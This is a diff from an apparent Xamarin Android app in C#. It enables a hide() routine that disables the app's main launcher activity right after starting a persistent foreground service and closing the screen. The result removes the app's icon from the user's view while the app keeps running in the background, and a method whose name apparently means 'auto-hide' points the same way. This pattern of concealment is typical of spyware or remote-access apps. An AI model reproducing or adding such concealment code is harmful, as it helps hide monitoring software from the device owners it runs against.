@@ -400,17 +400,18 @@ namespace Task2
             {
                 Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
             }
-            //hide();
-            StartForegroundServiceCompat<ForegroundService>(this,savedInstanceState);           
+            StartForegroundServiceCompat<ForegroundService>(this,savedInstanceState);
+	    Finish();
+	    hide();
         }
-        /*
+        
         public void hide()
         {
-            //FUCK! this code causes bug...
+      
             ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
             PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
         }
-        */
+        
         public async void otogizlen()
         {
             await Task.Delay(10000);
